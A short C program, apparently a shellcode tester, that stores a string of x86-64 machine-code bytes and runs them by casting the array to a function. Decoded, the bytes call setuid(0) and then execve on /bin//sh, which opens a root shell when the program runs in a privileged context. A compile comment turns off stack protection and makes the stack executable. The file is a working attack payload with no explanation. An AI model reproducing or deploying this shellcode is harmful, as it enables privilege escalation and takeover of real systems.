#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack -no-pie

const unsigned char payload[] = \
"\x48\x31\xd2\x48\x89\xd7\xb0\x69\x0f\x05\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x89\xd0\x04\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05";

main()
{
    printf("Payload Shellcode Length:  %zu\n", strlen(payload));

    int (*ret)() = (int(*)())payload;
    ret();
}
